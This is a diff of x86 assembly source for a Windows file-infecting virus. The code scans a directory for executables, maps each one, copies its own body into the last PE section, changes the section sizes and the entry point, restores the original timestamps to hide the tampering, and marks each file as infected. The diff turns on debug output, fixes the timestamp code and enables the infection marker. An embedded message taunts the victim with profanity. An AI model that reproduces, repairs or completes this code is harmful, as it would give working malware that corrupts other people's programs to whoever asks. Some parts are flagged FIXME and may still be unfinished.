@@ -1,7 +1,7 @@
 %include "io.inc"
 %include "./common.inc"
 
-%define DEBUG               0
+%define DEBUG               1
 
 virusLen equ	            end - start
 
@@ -45,11 +45,13 @@ section .data
     fileAlign               dd 0
     memoryToMap             dd 0
     infectionFlag           dd 0
-    fileOffset              dd 0
+    fileOffset              dd 0    ;removable
     fileAttributes          dd 0
     newFileSize             dd 0
     fileHandle              dd 0
-    fileTimesSave           dd 0
+    lastWriteTime           dq 0
+    lastAccessTime          dq 0
+    creationTime            dq 0
     mapHandle               dd 0
     mapAddress              dd 0
     PEHeader                dd 0
@@ -261,10 +263,10 @@ discard:
     push    ebx                ; Push the address of file mask
     call    [FindFirstFileA]
     cmp     eax, -1
-    mov     edi, eax           ; edi will store the file handle
     jz      done
-    mov     esi, [search + 44]
-    mov     ecx, [search + 32]
+    mov     edi, eax            ; edi will store the file handle
+    mov     esi, [search + 44]  ; read pointer to file name
+    mov     ecx, [search + 32]  ; read file size (lower 4 bytes)
     call	  InfectFile   
 again:    
     lea     ebx, [search]
@@ -274,7 +276,7 @@ again:
     call    [FindNextFileA]
     cmp     eax, 0
     jz      done
-    PRINT_FILE
+    PRINT_FILE [search + 44]
     mov     esi, [search + 44]
     mov     ecx, [search + 32]
     call	  InfectFile
@@ -303,10 +305,8 @@ done:
     push    edx                     ; hFile
     call    [WriteFile]
 
-exit:     
-    ; ExitProcess(0)
-    push    0
-    call    [ExitProcess]
+    jmp     end                     ; Get the fuck out
+
 
 getEIP:
     mov eax, [esp]
@@ -322,7 +322,8 @@ InfectFile:
 ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
     pushad								   ; Save all registers
  
-    mov	  [newFileSize], ecx          ; Save file size
+    PRINTD "originalFileSize", ecx
+    mov	  [newFileSize], ecx          ; Save file size, old size at this point
     mov     ebx, 0
     mov	  [infectionFlag], ebx        ; Reset the infection flag
     add	  ecx, virusLen               ; ECX = victim filesize + virus
@@ -360,7 +361,7 @@ InfectFile:
     push	  ebx                          ; General write and read
     lea     ebx, [search + 44] 
     push	  ebx                          ; Address to filename
-    call    [CreateFileA]                          ; create the file
+    call    [CreateFileA]                ; create the file
                                          ; EAX = file handle
  
     mov     [fileHandle], eax            ; Save file handle
@@ -373,23 +374,15 @@ InfectFile:
 ;;    - Last write time                              ;;
 ;;    - Last access time                             ;;
 ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
-    lea     ebx, [fileTimesSave]
+    lea     ebx, [lastWriteTime]
     push    ebx
-    add     ebx, 8
+    lea     ebx, [lastAccessTime]
     push    ebx
-    add     ebx, 8
+    lea     ebx, [creationTime]
     push    ebx
-    push    eax
-    call    [GetFileTime]                           ; save time fields
-    
-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
-;; Now lets get the file size and save it for later  ;;
-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
-    push    0						            ; Save the filesize for later
     mov     ebx, [fileHandle]
     push    ebx
-    call    [GetFileSize]                 ; save file size
-    ;add    [newfilesize], eax            ; ** mov -> add
+    call    [GetFileTime]                           ; save time fields ;FIXME
     
 ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 ;; create file mapping for the file                  ;;
@@ -402,7 +395,7 @@ InfectFile:
     push    0                             ; Security attributes
     mov     ebx, [fileHandle]             ; File handle
     push    ebx
-    call    [CreateFileMappingA]                           ; map file to memory
+    call    [CreateFileMappingA]          ; map file to memory
 									            ; EAX = new map handle
  
     mov     [mapHandle], eax				  ; Save map handle
@@ -412,6 +405,7 @@ InfectFile:
 ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 ;; map the view of that file                         ;;
 ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+    PRINTD "memoryToMap", memoryToMap
     mov     ebx, [memoryToMap]            ; # Bytes to map
     push    ebx
     push	  0						            ; File offset low
@@ -419,7 +413,7 @@ InfectFile:
     push	  2						            ; File Map Write Mode
     mov     ebx, [mapHandle]              ; File Map Handle
     push    ebx
-    call    [MapViewOfFile]                           ; map file to memory
+    call    [MapViewOfFile]               ; map file to memory
  
     cmp     eax, 0       					  ; Error ?
     je      CloseMap						  ; Cant map view of file ?
@@ -483,23 +477,23 @@ OkGo:
 
     PRINT_TRACE ;5
 
-    mov     ebx, [codeSegment]     ; pointer to raw data of code segment
+    mov     ebx, [codeSegment]          ; pointer to raw data of code segment
     mov     eax, [ebx + 20]
-    mov     ebx, [codeSegment]      ; virtual size of code segment
+    mov     ebx, [codeSegment]          ; virtual size of code segment
     add     eax, [ebx + 8]
     mov     [diskEP], eax               ; where exectuable code is (entryPoint will jump here)
 
     PRINT_TRACE ;6
 
-    mov     eax, [imageBase]
-    add     eax, [esi + 12]
-    add     eax, [esi + 8]
+    mov     eax, [imageBase]            ; ESI = Pointer to the last section header
+    add     eax, [esi + 12]             ; VirtualAddress
+    add     eax, [esi + 8]              ; VirtualSize
     mov     [virusAddress], eax
 
     PRINT_TRACE ;7
-
-    mov     eax, [esi + 20]
-    add     eax, [esi + 8]
+                                        ; ESI = Pointer to the last section header
+    mov     eax, [esi + 20]             ; reading PointerToRawData
+    add     eax, [esi + 8]              ; reading VirtualSize
     mov     [virusLocation], eax
 
     PRINT_TRACE ;8
@@ -516,16 +510,17 @@ OkGo:
 ;; The flags tell the loader that the section now    ;;
 ;; has executable code and is writable               ;;
 ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
-    mov     eax, [esi + 10h]            ; EAX = size of raw data in this section
-    mov     [oldRawSize], eax				; Save it
-    add     dword [esi + 8h], virusLen	; Increase virtual size
+    mov     eax, [esi + 0x10]               ; EAX = size of raw data in this section (ESI = Pointer to the last section header)
+    mov     [oldRawSize], eax				    ; Save it
+    add     dword [esi + 0x08], virusLen	 ; Increase virtual size
+    PRINTD "oldRawSize", oldRawSize
  
 ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 ;; Update ImageBase                                  ;;
 ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
-    mov     eax, [esi + 8h]             ; Get new size in EAX
-    add     eax, [esi + 12]             ; + section rva
-    mov     [ebx + 80], eax
+    mov     eax, [esi + 0x08]             ; Get new size in EAX
+    add     eax, [esi + 0x0C]             ; + section rva
+    mov     [ebx + 0x50], eax
     
 ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 ;; The size of raw data is the actual size of the    ;;
@@ -536,26 +531,27 @@ OkGo:
 ;; to the filealign value and we get as a reminder   ;;
 ;; the number of bytes to pad                        ;;
 ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
-    mov     eax, [esi + 8h]             ; Get new size in EAX
+    mov     eax, [esi + 0x08]           ; Get new size in EAX
     mov     ecx, [fileAlign]				; ECX = File alignment
     div     ecx                         ; Get remainder in EDX
     mov     ecx, [fileAlign]				; ECX = File alignment
     sub     ecx, edx						; Number of bytes to pad
-    mov     [esi + 10h], ecx				; Save it
+    mov     [esi + 0x10], ecx				; Save it
     PRINT_TRACE ;9
  
 ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 ;; Now size of raw data = number of bytes to pad     ;;
 ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
-    mov     eax, [esi + 8h] 				; Get current VirtualSize
-    add     eax, [esi + 10h]				; EAX = SizeOfRawdata padded
-    mov     [esi + 10h], eax				; Set new SizeOfRawdata
+    mov     eax, [esi + 0x08] 			; Get current VirtualSize
+    add     eax, [esi + 0x10]				; EAX = SizeOfRawdata padded
+    mov     [esi + 0x10], eax				; Set new SizeOfRawdata
     
 ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 ;; Now size of raw data = old virtual size +         ;;
 ;; number of bytes to pad                            ;;
 ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
     mov     [newRawSize], eax				; Save it
+    PRINTD "newRawSize", newRawSize
  
 ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 ;; The virus will be at the end of the section, In   ;;
@@ -565,11 +561,10 @@ OkGo:
 ;; VirtualAddress + VirtualSize - VirusLength        ;;
 ;;      + RawSize = VirusStart                       ;;
 ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
-    mov eax, [codeSegment]
+    mov     eax, [codeSegment]
     mov     ebx, [codeSegment]
-    mov     eax, [ebx + 12]     ; Reading code segment's RVA
-    PRINT_TRACE;10
-    add     eax, [ebx + 8]      ; Add the size of the segment
+    mov     eax, [ebx + 0x0C]     ; Reading code segment's RVA
+    add     eax, [ebx + 0x08]      ; Add the size of the segment
     PRINT_TRACE;11
     mov     [newEntryPoint], eax			; EAX = new EIP, and save it
     PRINT_TRACE;12
@@ -587,9 +582,11 @@ OkGo:
 ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 ;; Compute the new file size                         ;;
 ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
-    mov     eax, [esi + 14h]				; File offset of section raw data
+    mov     eax, [esi + 0x14]				; Read PointerToRawData from last section's header
+    PRINTD "PointerToRawData", eax
     add     eax, [newRawSize]				; Add size of new raw data
     mov     [newFileSize], eax 			; EAX = new filesize, and save it
+    PRINTD "newFileSize", newFileSize
     
 ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 ;; Now prepare to copy the virus to the host, The    ;;
@@ -611,17 +608,17 @@ OkGo:
 
     mov     edi, [virusLocation]			; Location to copy the virus to
     add     edi, [mapAddress]
-    lea     esi, [start]                ; Location to copy the virus from
+    mov     eax, [EIP]
+    sub     eax, 5
+    lea     esi, [eax]              ; Location to copy the virus from
     mov     ecx, virusLen					; Number of bytes to copy
     rep     movsb							; Copy all the bytes
     PRINT_TRACE ;15
 
     mov     eax, virusLen
-    PRINT_VALUE "virusLen", eax
+    PRINTD "virusLen", eax
     add     eax, [virusLocation]
-    PRINT_VALUE "virusLen", eax
     add     eax, [mapAddress]
-    PRINT_VALUE "virusLen", eax
 
     PRINT_TRACE ;16
 
@@ -651,7 +648,7 @@ OkGo:
 ;; Now, lets mark the file as infected               ;;
 ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
     mov     esi, [mapAddress]
-    ;mov     word [esi + 38h], 0x4144 ;'AD'  ; Mark file as infected
+    mov     word [esi + 38h], 0x4144 ;'AD'  ; Mark file as infected
     PRINT_TRACE ;16
  
 UnmapView:
@@ -667,15 +664,15 @@ CloseMap:
     PRINT_TRACE
     
 CloseFile:
-    lea	  ebx, [fileTimesSave]
-    push	  ebx
-    add	  ebx, 8
-    push	  ebx
-    add	  ebx, 8
-    push	  ebx
+    lea     ebx, [lastWriteTime]
+    push    ebx
+    lea     ebx, [lastAccessTime]
+    push    ebx
+    lea     ebx, [creationTime]
+    push    ebx
     mov     ebx, [fileHandle]
     push    ebx
-    call    [SetFileTime]
+    call    [SetFileTime]                           ; set time fields ;FIXME
     PRINT_TRACE
 ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 ;; In order to properly close the file we must set   ;;
@@ -733,10 +730,12 @@ OutOfHere:
     PRINT_TRACE
     popad								; Restore all registers
     PRINT_TRACE
-    
     retn
     
-    
+; end of InfectFile 
+
+    ; continuation of the main function
+        
     message:                db 'Im a virus, motherfucker!', 10, 'GET HACKED!!!', 10
     message_end:      
     directory:              db "C:\Assembly\Dummies\", 0
@@ -745,6 +744,10 @@ OutOfHere:
         at offset,          dd 0xFFFFFFFF
         at offsetHigh,      dd 0xFFFFFFFF
     iend
-
-
+    
 end:
+   
+    ; ExitProcess(0)
+    push    0
+    call    [ExitProcess]
+    
